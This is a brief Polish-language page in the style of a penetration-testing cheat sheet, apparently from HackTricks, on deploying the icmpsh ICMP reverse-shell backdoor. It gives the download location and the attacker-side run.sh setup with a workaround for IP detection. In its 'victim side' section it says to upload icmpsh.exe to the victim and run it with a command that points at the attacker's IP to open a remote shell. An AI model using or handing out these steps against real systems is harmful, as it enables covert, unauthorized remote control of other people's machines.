{{#include ../banners/hacktricks-training.md}}

Pobierz backdoora z: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Strona klienta

Wykonaj skrypt: **run.sh**

**Jeśli otrzymasz jakiś błąd, spróbuj zmienić linie:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Dla:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Strona ofiary**

Prześlij **icmpsh.exe** do ofiary i wykonaj:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
